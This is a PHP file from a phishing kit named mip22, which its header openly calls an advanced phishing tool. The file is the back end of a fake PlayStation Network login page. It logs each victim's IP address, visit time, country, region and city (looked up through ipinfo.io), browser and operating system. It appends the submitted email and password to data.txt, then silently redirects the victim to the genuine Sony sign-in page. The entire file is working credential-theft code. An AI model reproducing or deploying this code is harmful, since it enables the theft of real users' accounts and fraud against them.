<?php 

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  mip22 is a advanced phishing tool.
*
*  mip22 is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  mip22 is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


// Set File write informations
$file = "data.txt";


// Get Full date of victim visit
$full_date = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser = $_SERVER['HTTP_USER_AGENT'];


// Get Victim Os System

function get_operating_system() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $operating_system = 'Unknown Operating System';

    //Get the operating_system name
    if (preg_match('/linux/i', $u_agent)) {
        $operating_system = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
        $operating_system = 'Mac';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
        $operating_system = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent)) {
        $operating_system = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent)) {
        $operating_system = 'IPhone';
    } elseif (preg_match('/ipod/i', $u_agent)) {
        $operating_system = 'IPod';
    } elseif (preg_match('/ipad/i', $u_agent)) {
        $operating_system = 'IPad';
    } elseif (preg_match('/android/i', $u_agent)) {
        $operating_system = 'Android';
    } elseif (preg_match('/blackberry/i', $u_agent)) {
        $operating_system = 'Blackberry';
    } elseif (preg_match('/webos/i', $u_agent)) {
        $operating_system = 'Mobile';
    }
    
    return $operating_system;
}


$os_system = get_operating_system();



// Get Victim Geolocation Info
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$PublicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json     = json_decode($json, true);
$country  = $json['country'];
$region   = $json['region'];
$city     = $json['city'];




file_put_contents($file, print_r("\nPLAYSTATION VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
file_put_contents($file, print_r("Country: $country \n", true), FILE_APPEND);
file_put_contents($file, print_r("Region: $region \n", true), FILE_APPEND);
file_put_contents($file, print_r("City: $city \n", true), FILE_APPEND);
file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
file_put_contents($file, "Username: " . $_POST['email'] . "\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['pass'] . "\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://my.account.sony.com/central/signin/?duid=000000070009010082dcbcc7a168314fc70a2b2a68ca0a6b4b7424e273e3ff4a0b5e368320ddf025&response_type=code&client_id=e4a62faf-4b87-4fea-8565-caaabb3ac918&scope=web%3Acore&access_type=offline&state=f809af5bb798a41aa5a36c69044f3bdec9671809e31f112511e30a9ae3300679&service_entity=urn%3Aservice-entity%3Apsn&ui=pr&smcid=web%3Apdc&redirect_uri=https%3A%2F%2Fweb.np.playstation.com%2Fapi%2Fsession%2Fv1%2Fsession%3Fredirect_uri%3Dhttps%253A%252F%252Fio.playstation.com%252Fcentral%252Fauth%252Flogin%253Flocale%253Del_GR%2526postSignInURL%253Dhttps%25253A%25252F%25252Fwww.playstation.com%25252Fel-gr%25252Fplaystation-network%25252F%2526cancelURL%253Dhttps%25253A%25252F%25252Fwww.playstation.com%25252Fel-gr%25252Fplaystation-network%25252F%26x-psn-app-ver%3D%2540sie-ppr-web-session%252Fsession%252Fv5.13.1&auth_ver=v3&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=false&cid=f9f0b219-aba0-473d-841a-3a7f20dd491b#/signin/ca?entry=ca"/> 
